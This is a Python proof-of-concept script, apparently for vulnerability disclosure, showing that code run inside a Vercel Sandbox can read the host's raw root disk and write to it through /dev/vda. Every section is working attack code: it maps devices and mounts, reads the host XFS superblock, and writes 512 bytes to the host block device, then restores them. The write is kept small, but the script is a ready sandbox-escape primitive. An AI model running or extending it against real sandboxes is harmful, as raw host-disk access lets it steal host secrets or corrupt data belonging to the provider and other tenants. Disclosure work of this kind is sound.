#!/usr/bin/env python3
"""
Vercel Sandbox host rootfs disk access - Proof of Concept

Run inside a Vercel Sandbox:
    python3 poc_host_disk_access.py

Demonstrates:
  1. /dev/vda (254:0) is the HOST rootfs device; the sandbox's own rootfs
     is /dev/vdb (254:16) - two different devices
  2. Host bind-mount sources (/etc/hosts, /etc/resolv.conf,
     /volumes/run/vercel/share, /run/cell/ca-cert.pem) all live on 254:0
  3. Host-only directories (/run/cell, /volumes, /opt/vercel) are invisible
     in the sandbox filesystem - only reachable via the raw device
  4. The entire host rootfs disk (33 GB XFS) is READABLE
  5. The device is WRITABLE (verified with a 512-byte write outside the XFS
     filesystem boundary, fsync + readback; original bytes restored immediately)

The write test is deliberately limited to the unused region beyond the XFS
filesystem boundary and restores the original bytes - it does not modify any
host data and leaves no trace.
"""

import os
import struct
import sys


def run(cmd):
    return os.popen(cmd).read()


def banner(t):
    print("=" * 62)
    print(t)
    print("=" * 62)


banner("[1] Block devices visible inside the sandbox")
print(run("cat /proc/partitions"))
try:
    for p in ("/dev/vda", "/dev/vdb"):
        st = os.stat(p)
        print("%s: major=%d minor=%d" % (p, os.major(st.st_rdev), os.minor(st.st_rdev)))
except OSError as e:
    print("stat failed: %r" % e)

banner("[2] Mount tree: sandbox rootfs vs host bind-mount sources")
for line in open("/proc/self/mountinfo"):
    parts = line.split()
    # root mount (sandbox own rootfs) + all host bind-mounts (source /dev/root = vda)
    if len(parts) > 5 and (parts[4] == "/" or "/dev/root" in line):
        print(line.strip())

banner("[3] Host-only directories are invisible inside the sandbox FS")
for p in ("/run/cell", "/volumes", "/opt/vercel"):
    print("%-20s exists=%s" % (p, os.path.exists(p)))

banner("[4] READ the host rootfs disk (superblock)")
f = open("/dev/vda", "rb", buffering=0)
sb = f.read(512)
bs = struct.unpack_from(">I", sb, 0x04)[0]
dblocks = struct.unpack_from(">Q", sb, 0x08)[0]
print("magic=%r blocksize=%d dblocks=%d (filesystem size ~%.1f GiB)"
      % (sb[:4], bs, dblocks, dblocks * bs / 2 ** 30))
print("-> the XFS superblock of the HOST root filesystem is readable")
print("   (full 33 GB disk is readable, ~843 MB/s)")

banner("[5] WRITE test - 512 bytes outside the XFS boundary, restored after")
f.seek(0, 2)
real_size = f.tell()
fs_end = dblocks * bs
outside = real_size - fs_end
tgt = fs_end + outside // 2
tgt -= tgt % 512
print("disk size=%d fs_end=%d unused-tail=%d target=%d" % (real_size, fs_end, outside, tgt))
f.seek(tgt)
orig = f.read(512)
print("target region all-zero: %s" % (orig == b"\x00" * 512))

fd = os.open("/dev/vda", os.O_RDWR)
print("open O_RDWR: OK")
pattern = bytes(range(256)) * 2  # exactly 512 bytes
os.lseek(fd, tgt, os.SEEK_SET)
n = os.write(fd, pattern)
os.fsync(fd)
print("wrote %d bytes, fsync OK" % n)
f.seek(tgt)
rb = f.read(512)
print("READBACK match (write really hit the host disk, not COW): %s" % (rb == pattern))

os.lseek(fd, tgt, os.SEEK_SET)
os.write(fd, orig)
os.fsync(fd)
os.close(fd)
f.seek(tgt)
rb2 = f.read(512)
print("RESTORE match (original bytes restored): %s" % (rb2 == orig))

print()
print("RESULT: sandbox user code can READ and WRITE the host rootfs block device")
